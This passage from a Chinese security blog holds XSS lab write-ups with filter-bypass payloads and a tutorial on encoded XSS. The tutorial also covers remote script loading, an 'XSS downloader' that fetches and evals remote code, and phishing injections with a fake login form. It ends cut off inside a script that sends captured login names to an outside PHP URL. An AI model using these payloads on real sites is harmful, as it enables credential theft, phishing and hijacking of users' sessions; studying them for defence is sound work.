from&#x3D;&#x3D;1的时候，就不会报错.<br>但问题又来了，我们现在添加了许多东西，而添加的这些东西，包含了许多特殊字符，会不会通过呢，经过实际测试，空格符被转义了。<br>空格符被转义了怎么办呢，我们找到新的替换品，那就是&#x2F;**&#x2F;, 这是一个注释符，之前我们也测试过了，斜杠不会被过滤，那么这个注释符，成功的顶替了空格，形成了正常的语法。<br>故最终payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://mail.qq.com/cgi-bin/login?vt=passport&amp;ss=\&amp;from==0;alert(1);function/**/from()&#123;&#125;;//&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%25252Fcgi-bin%25252Fsetting10%25253Faction%25253Dlist%252526t%25253Dsetting10%252526ss%25253Dindex%252526Mtype%25253D1%252526clickpos%25253D20%252526loc%25253Ddelegate%25252Cwebmap%25252C%25252C1</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>1.&#x3D;&#x3D;的优先级比 &amp; 高，所以语句相当于 (“字符串”)&amp;(from&#x3D;&#x3D;1)<br>2.from未定义，直接和1进行相等判断的话，会报错，错误是：“from”未定义</p><p>3.javascript里有一个特性:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aaa();</span><br><span class="line">function aaa()&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>凡是以 function xxx(){} 形式定义的函数，都会被最优先解析。换句话说：<br>解析器在解析JS代码段时，会先将 function xxx(){} 拿到最前面解析，然后再依次解析其它的部分。 换句话说，上面的代码，实际的解析顺序是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function aaa()&#123;</span><br><span class="line">&#125;</span><br><span class="line">aaa();</span><br></pre></td></tr></table></figure><p>这便是隐藏在payload中的知识点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from()&#123;&#125;//&quot;+&quot;&amp;param=&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function from()</span><br><span class="line">&#123;</span><br><span class="line">aaaaa from == 1;</span><br><span class="line">alert(1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="-7"><a href="#-7" class="headerlink" title="&lt;6&gt;"></a>&lt;6&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/6.php?libid=178&FilterAttrAND=3602&FilterValueAND=dota">点击进入本例模拟环境</a></p><h3 id="测试-5"><a href="#测试-5" class="headerlink" title="测试"></a>测试</h3><p>用了几个常用符<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-bfbeaa7cebfc8c17.png" alt="图片.png"><br>我们在一些注释的代码中也能发现我们的符号们，不难发现被过滤的和没被过滤的<br>那么我们需要思考，如果我们能让代码跳出注释范围，再利用alert(1)触发XSS，这样不就达到我们的目的了吗？</p><h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>所以这里需要再科普一下<strong>换行符%0a</strong><br>现在在view source里先构造我们的payload，观察有没有什么变化，<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-f312b43cf3d6e7d1.png" alt="图片.png"><br>不难发现我们已经成功跳出注释圈，成功的触发XSS，不过这里也要注意，为了闭合后面的”,由于双引号被过滤，所以我们只能将它注释掉。<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0aalert(1);//</span><br></pre></td></tr></table></figure><h2 id="-8"><a href="#-8" class="headerlink" title="&lt;7&gt;"></a>&lt;7&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/7.php?mod=search&type=data&site=digi&libid=2&curpage=1&pagenum=30&filterattr=138,138%7C16%7C4,5,4,5&filtervalue=3500-4000,%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD4000%7C%EF%BF%BD%EF%BF%BD%D7%AA%7CWCDMA,WCDMA,HSDPA,HSDPA&tplname=centersearch.shtml&orderby=price">点击进入本例模拟环境</a></p><h3 id="测试-6"><a href="#测试-6" class="headerlink" title="测试"></a>测试</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-98c28d1beb111eb3.png" alt="图片.png"><br>简单的测试，能找到被过滤的符号</p><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>通过审计我们发现，这与上一道题相似，需要跳出注释圈</p><h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%5c%0aalert(1);//</span><br></pre></td></tr></table></figure><p>发现不太行，源码里多了一个\，也就是这里防\，所以我们需要吃掉\</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa%c0%5c%0aalert(1);//</span><br></pre></td></tr></table></figure><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>javascript，字符串允许下面多行的写法。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var  a=&quot;我是一个字符串\</span><br><span class="line"></span><br><span class="line">我还是一个字符串&quot;;</span><br><span class="line"></span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure><p>基于这点，把缺陷点构造成下面的样子。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//document.getElementById(&quot;order_select&quot;).value = &quot;aaaa\</span><br><span class="line">alert(1);//&quot;;</span><br><span class="line"></span><br><span class="line"> var searchOrder = &quot;aaaa\</span><br><span class="line"></span><br><span class="line">alert(1);//&quot;;</span><br></pre></td></tr></table></figure><p>也就是用到换行符 %0a<br>反斜杠问题中%c0可以吃掉%5c<br>%5c就是\</p><h2 id="-9"><a href="#-9" class="headerlink" title="&lt;8.1&gt;"></a>&lt;8.1&gt;</h2><p><a href="http://xsst.sinaapp.com/xss/ext/8.1.php">点击进入本例模拟环境 8.1</a></p><h3 id="测试-7"><a href="#测试-7" class="headerlink" title="测试"></a>测试</h3><p>测试之后我们发现过滤情况和之前差不多。<br>在js中的字符串中的字符可以写为 unicode编码。<br>故我们将&lt;&gt;进行编码，&lt; 可以表示为 \u003c , &gt; 可以表示为 \u003e</p><h3 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h3><figure class="highlight plaintext"><figcaption><span>src</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">```\u003cimg src=1\u003e``` 再次尝试 ，发现页面出现反应了，利用这个漏洞</span><br><span class="line">```\u003cimg src=1 onerror=alert(1)\u003e```</span><br><span class="line"></span><br><span class="line">## &lt;8.2&gt;</span><br><span class="line"></span><br><span class="line">[点击进入本例模拟环境 8.2](http://xsst.sinaapp.com/xss/ext/8.2.php?libid=1&amp;keyvalue=DK&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml)</span><br><span class="line"></span><br><span class="line">#### 测试</span><br><span class="line"></span><br><span class="line">经过简单的测试发现它和上一道题基本类似</span><br><span class="line"></span><br><span class="line">### 解题</span><br><span class="line"></span><br><span class="line">那我们就开始大胆的解题了，尝试用上一道题的方法</span><br><span class="line">![图片.png](https://upload-images.jianshu.io/upload_images/14443259-75c9ab5d54eb44ea.png?imageMogr2/auto-orient/strip|imageView2/2/w/1240)</span><br><span class="line">很遗憾，很不幸，很失望，我们发现unicode编码&lt;&gt;也被过滤了</span><br><span class="line">在JS字符串里， &lt; 不光可以写为 \u003c，还可以写为 \x3c， &gt; 同样可以写为 \x3e。</span><br><span class="line">我们再试试这个，出现弹窗。故，</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>\x3cimg src&#x3D;1 onerror&#x3D;alert(1)\x3e</p><pre><code>### 修复方案修复方案：方法1. 输出时，过滤 \方法2. innerHTML=encodeHTML([输出])</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS Cross-Site Attacks</title>
      <link href="/2019/03/09/XSS-Cross-Site-Attacks/"/>
      <url>/2019/03/09/XSS-Cross-Site-Attacks/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是XSS？"><a href="#什么是XSS？" class="headerlink" title="什么是XSS？"></a>什么是XSS？</h2><blockquote><p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 Web 应用程序中的计算机安全漏 洞，是由于 Web 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本 代码（通常包括 HTML 代码和客户端 Javascript 脚本）注入到网页之中，当其他用户浏览这些网 页时，就会执行其中的恶意代码，对受害用户可能采取 Cookie 资料窃取、会话劫持、钓鱼欺骗 等各种攻击。<br>由于和另一种网页技术——层叠样式表（Cascading Style Sheets，CSS）的缩写一样，为了防 止混淆，故把原本的 CSS 简称为 XSS。 通常情况下，我们既可以把跨站脚本理解成一种 Web 安全漏洞，也可以理解成一种攻击手段。</p></blockquote><h2 id="XSS攻击流程"><a href="#XSS攻击流程" class="headerlink" title="XSS攻击流程"></a>XSS攻击流程</h2><p>XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户 受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当 受害者在 Web 浏览器中打开该 URL 的时侯，恶意脚本会在受害者的计算机上悄悄执行，流程如图</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14443259-29b5a9403ba7cce6.png" alt="图片.png"></p><h2 id="XSS-漏洞的危害"><a href="#XSS-漏洞的危害" class="headerlink" title="XSS 漏洞的危害"></a>XSS 漏洞的危害</h2><blockquote><p>（1）网络钓鱼，包括盗取各类用户账号；<br>（2）窃取用户 cookies 资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操 作；<br>（3）劫持用户（浏览器）会话，从而执行任意操作，例如进行非法转账、强制发表日志、发 送电子邮件等；<br>（4）强制弹出广告页面、刷流量等；<br>（5）网页挂马；<br>（6）进行恶意操作，例如任意篡改页面信息、删除文章等；<br>（7）进行大量的客户端攻击，如 DDoS 攻击；<br>（8）获取客户端信息，例如用户的浏览历史、真实 IP、开放端口等；<br>（9）控制受害者机器向其他网站发起攻击；<br>（10）结合其他漏洞，如 CSRF 漏洞，实施进一步作恶；<br>（11）提升用户权限，包括进一步渗透网站；<br>（12）传播跨站脚本蠕虫等；<br>##XSS攻击之利用字符编码<br>HTML 标签中的某些属性值可以使用&amp;#ASCII 方式进行编码改写，这种 XSS 转码支持十进制和十六进制形式。</p></blockquote><p>1.工具转码:使用在线工具将输入内容转码<br>2.函数转码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 <span class="title class_">JavaScript</span> 中有一个 <span class="built_in">eval</span>()函数，该函数可计算字符串，并执行其中的 <span class="title class_">JavaScript</span></span><br><span class="line">代码，如下所示： </span><br><span class="line">&lt;script&gt; <span class="built_in">eval</span>(<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>); &lt;/script&gt; </span><br><span class="line">我们可以使用\连接十六进制字符串，然后使用 <span class="built_in">eval</span>()函数执行十六进制字符串形式的脚本， 如对 <span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)进行十六进制转码后得到： </span><br><span class="line">\<span class="number">61</span>\6c\<span class="number">65</span>\<span class="number">72</span>\<span class="number">74</span>\<span class="number">28</span>\<span class="number">27</span>\<span class="number">58</span>\<span class="number">53</span>\<span class="number">53</span>\<span class="number">27</span>\<span class="number">29</span> </span><br></pre></td></tr></table></figure><p>完整如下：<br><code>&lt;script&gt; eval(&quot;\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29&quot;); &lt;/script&gt;</code><br>3.函数结合转码:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string.<span class="title function_">formcharcode</span>()用于将字符转为 <span class="variable constant_">ASCII</span> 值</span><br><span class="line">结合使用 <span class="built_in">eval</span>()和 <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>()函数后变成： </span><br><span class="line">&lt;embed src=<span class="string">&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))&quot;</span>&gt; </span><br></pre></td></tr></table></figure><p>4.样式表转码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">可以对 background 的属性值进行十六进制字符串形式转换： </span><br><span class="line">&lt;style&gt; </span><br><span class="line"><span class="variable constant_">BODY</span> &#123; </span><br><span class="line"><span class="attr">background</span>: \<span class="number">75</span>\<span class="number">72</span>\6c\<span class="number">28</span>\<span class="number">68</span>\<span class="number">74</span>\<span class="number">74</span>\<span class="number">70</span>\3a\2f\2f\<span class="number">31</span>\<span class="number">32</span>\<span class="number">37</span>\2e\<span class="number">30</span>\2e\<span class="number">30</span>\2e\<span class="number">31</span>\2f\<span class="number">78</span>\<span class="number">73</span>\<span class="number">73</span>\2e\<span class="number">67</span>\<span class="number">69</span>\<span class="number">6</span> <span class="number">6</span>\<span class="number">29</span> &#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;xss:<span class="symbol">&amp;#101;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#111;</span><span class="symbol">&amp;#110;</span>(alert(1));&quot;</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> </span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image:\0075\0072\006C\0028\006A\0061\0076\0061\0073\0063\0072\ 0069\0070\0074\003A\0061\006C\0065\0072\0074\0028\0027\0058\0053\0053\0027\0029\002 9&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure><blockquote><p>style 属性中的 javascript、expression 等字符一般会被程序过滤，但经过十六进制编码后则可 以逃避过滤</p></blockquote><p>5.JScript Encode 和 VBScript Encode<br>脚本加密的两种形式:JScript 和 VBScript.<br>经过加密的脚本，能在 IE下正常运行，在其他浏览器下则不识别。<br>如 **alert(1)**使用 JScript Encode 加密的结果为：<br><code>#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@</code><br>经 XSS Expliot 后变为：<br><code>&lt;script language=&quot;JScript.Encode&quot;&gt; #@~^CAAAAA==C^+.D`8#mgIAAA==^#~@ &lt;/script&gt;</code><br> VBScript.Encode :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=# language=<span class="string">&quot;JScript.Encode&quot;</span>  onclick=<span class="string">&quot;#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&quot;</span>&gt;test&lt;/a&gt; </span><br><span class="line">&lt;iframe onload=JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@&gt;</span><br><span class="line"> &lt;iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@&gt;</span><br><span class="line"> &lt;iframe onload=VBScript&amp;#46;Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@&gt; </span><br></pre></td></tr></table></figure><p><strong>复杂的</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div style=<span class="string">&quot;\000000000000000000000078\000000000000000000000073s:e&amp;#x5c;&amp;#x78;p&amp;#47;&amp;#42;&amp;#106;&amp;#110;&amp;#118;&amp;#42;&amp;#47;\0072\0065ssion(window.x?0:(alert(/XSS/),window.x= 1));&quot;</span>&gt;&lt;/div&gt; </span><br></pre></td></tr></table></figure><h2 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h2><p> 所谓的 Shellcode，最初是溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞时所执行 的代码。在 XSS 跨站脚本中，是指由 JavaScript 等脚本编写的 XSS 利用代码。</p><blockquote><p>【Exploit】<br>Exploit 的英文意思就是利用，在黑客眼里就是漏洞利用，通常表示完整编写好的漏洞利用 工具（或程序），具有一定的攻击性。 Exploit 很容易和 Shellcode 混淆，所以需要记住一点：Exploit 往往包含了 Shellcode。<br>【POC】<br>即 Proof of Concept 的缩写，是一段证明漏洞存在的程序代码片段。</p></blockquote><p>在传统 XSS 的运用中，Shellcode 一般是直接写进页面中执行，不过实际环境中可能会遇到 重重阻挠，比如服务器端程序的过滤、输入字符有长度限制等，所以，攻击者往往会把 Shellcode 写到远程服务器上，然后使用<script>等标签对其进行调用，或者使用一些本地存储对象对其进 行存储和调用等。<br> 在 XSS 中调用 Shellcode 有多种方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 动态调用远程 JavaScript</span><br><span class="line">2.使用 window.location.hash</span><br><span class="line">3. XSS Downloader </span><br></pre></td></tr></table></figure><h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>payload: <script src="http://localhost/XSS.js"></script></p><h4 id="脚本：动态调用"><a href="#脚本：动态调用" class="headerlink" title="脚本：动态调用"></a>脚本：动态调用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(&quot;script&quot;);</span><br><span class="line">s.src=&quot;http://localhost/XSS.js&quot;;</span><br><span class="line">document.getElementsByTagName(&quot;head&quot;)[0].appendChild(s);</span><br></pre></td></tr></table></figure><p>第一行代码使用 createElement()函数创建一个新元素——script。<br>第二行代码把<script>的 src 属性设置成 “http://...”， xss.js 里面写有 Shellcode 代码。<br>第三行代码使用 getElementsByTagName()函数查找并返回文档中第一个元素（因为索引为 0）， 然后利用 appendChild()函数调用元素参数 s，追加指定的节点到子节点列表的最后一个。<br>简单 来说 ，这 段 脚本 的作 用就 是 动态 创建 了一 个<script>标 签 ，其 src 属性 指向 http://...，然后把引用 JavaScript 的代码插入到网页的<head>标签后。</p><h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>payload:localhost/XSS/test.php?sort=<script>eval(location.hash.substr(1))</script>#alert(‘xss’)</p><blockquote><p>substr()可在字符串中抽取从 start 下标（这里是 1）开始的指定数目的字符，所以 location.hash.substr(1) 的作用是抽取“#”符号后面的字符，即 alert(‘xss’)<br>eval()函数用来计算 某个字符串，并执行其中的 JavaScript 代码<br>eval(location.hash.substr(1))的功能就是执行 Url的#之后的 JavaScript 代码，<br>通过这个技巧，就能先把 Shellcode 写到地址参数中再执行</p></blockquote><h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><p>XSS Downloader:<br>将其存储到网站的数据库中，包括网 页信息、文章内容、个人资料等地方，然后再把它们下载下来执行。<br>简单地说，其实就是打造一个 XSS downloader（XSS 下载器），事先把 Shellcode 写在网站 的某个页面，再利用 XMLHTTP 控件向网站发送 HTTP 请求（POST 或 GET），然后执行返回的 数据。</p><p><strong>POC复现：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">XSS</span>(<span class="params"></span>)&#123; </span><br><span class="line">a=<span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);  </span><br><span class="line">a.<span class="title class_">Open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://www.bug.com/11221.html&#x27;</span>,<span class="literal">false</span>);/ </span><br><span class="line">a.<span class="title function_">send</span>(); </span><br><span class="line">b=a.<span class="property">responseText</span>;  </span><br><span class="line"><span class="built_in">eval</span>(<span class="built_in">unescape</span>(b.<span class="title function_">substring</span>(b.<span class="title function_">indexOf</span>(<span class="string">&#x27;BOF|&#x27;</span>)+<span class="number">4</span>,b.<span class="title function_">indexOf</span>(<span class="string">&#x27;|EOF&#x27;</span>))));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">XSS</span>();  </span><br></pre></td></tr></table></figure><p>第一行：定义一个 XSS()函数，该函数也就是调用 Shellcode 的主函数。<br>第二行：创建一个 XMLHTTP 对象。<br>第三、四行：向 <a href="http://www.bug.com/11221.html">http://www.bug.com/11221.html</a> 发送一个 HTTP 请求并获取 HTTP 响应。<br>第五行：获取 responseText，结果返回为字符串，把该变量赋值给 b 变量。<br>第六行：用 indexOf()函数计算 BOF|和|EOF 的位置，再用 substring()函数方法取出字符串， 最后用 unescape()函数方法解码执行。</p><h2 id="XSS钓鱼方式"><a href="#XSS钓鱼方式" class="headerlink" title="XSS钓鱼方式"></a>XSS钓鱼方式</h2><blockquote><p>（1）XSS 重定向钓鱼（XSS Redirect Phishing）<br>（2）HTML注入式钓鱼（XSS HTML Inject Phishing）<br>（3）XSS 跨框架钓鱼（Iframe Phishing）<br>（4）Flash 钓鱼（Flash Phishing）</p></blockquote><h3 id="一-1"><a href="#一-1" class="headerlink" title="一"></a>一</h3><p>payload:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="regexp">/.../i</span>ndex.<span class="property">php</span>?search=<span class="string">&quot;&#x27;&gt;&lt;script&gt;document.location.href=&quot;</span><span class="attr">http</span>:<span class="comment">//...&quot;&lt;/script&gt; </span></span><br></pre></td></tr></table></figure><h3 id="二-1"><a href="#二-1" class="headerlink" title="二"></a>二</h3><p>payload:<br><code>http://www.bug.com/index.php?search=”’&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;div style=&quot;text-align: center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br/&gt;Login:&lt;br/&gt; &lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br /&gt;&lt;br /&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br /&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</code></p><p> <strong>这段代码会在正常页面中嵌入一个 Form 表单,该表单可以覆盖 原页面显示，强迫用户输入账号和密码等信息。</strong></p><h3 id="三-1"><a href="#三-1" class="headerlink" title="三"></a>三</h3><p>这种方式是通过<Iframe>标签嵌入远程域的一个页面实施钓鱼<br>新建一个HTMLL文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt; </span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=gb2312&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>百度一下，你就知道      <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;<span class="name">body</span> <span class="attr">scroll</span>=<span class="string">&quot;no&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&quot;myFrame&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://www.baidu.com&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">scrolling</span> =<span class="string">&quot;auto&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;this.style.height=document.body.clientHeight&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> </span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span> </span><br></pre></td></tr></table></figure><p>上述代码会伪造一个和百度网页类似的网页，<br>payload:<br><code>http://.../index.php?search=&#39;&gt;&lt;iframe src=“http://...” height=&quot;100%&quot; width=&quot;100%&quot;&gt;&lt;/iframe&gt;</code></p><h3 id="四"><a href="#四" class="headerlink" title="四"></a>四</h3><p>Flash 钓鱼甚至不要求网站存在 XSS 漏洞，只要 攻击者把精心构造的 Flash 文件（比如一个假冒的登录框）上传到远程服务器，然后在目标网站 中使用<object>或<embed>标签去引用 Flash 即可。<br>当然，Flash 本身也存在许多的安全漏洞，包括 XSS、CSRF 和跨域等问题，而且 Flash 也有 内置的编程语言——ActionScript。ActionScript 与 JavaScript、服务端编程语言一样都可以作为跨 站攻击的一种辅助手段。</p><h2 id="XSS高级钓鱼技术"><a href="#XSS高级钓鱼技术" class="headerlink" title="XSS高级钓鱼技术"></a>XSS高级钓鱼技术</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><blockquote><p>黑客利用 XSS 漏洞可以窃取用户会话的 Cookie，从而窃取网站用户的隐私数据，包括 MD5 密码信息等。但是，如果网站使用了 Httponly 的 Cookie（将 Cookie 的属性设置为“Httponly” 就可防止 Cookie被恶意JavaScript脚本存取），或无法通过 Cookie欺骗等方式侵入受害者的账户， 那么窃取用户 Cookie 资料的方法就显得英雄无用武之地。<br>这种情况下，黑客更青睐于直接获取用户的明文账户密码信息。这时候就要用到一些高级的 XSS 钓鱼技术，而构成这些技术的主要元素无非是我们所熟知的 DHTML、JavaScript、Ajax等。</p></blockquote><h3 id="实例一"><a href="#实例一" class="headerlink" title="实例一"></a>实例一</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line"><span class="title class_">Form</span> = <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="string">&quot;userslogin&quot;</span>];</span><br><span class="line"><span class="title class_">Form</span>.<span class="property">onsubmit</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123; </span><br><span class="line"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">iframe.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>; </span><br><span class="line"><span class="title function_">alert</span>(<span class="title class_">Form</span>.<span class="property">user</span>.<span class="property">value</span>); </span><br><span class="line">iframe.<span class="property">src</span> = <span class="string">&quot;http://127.0.0.1/....php?user=&quot;</span>+<span class="title class_">Form</span>.<span 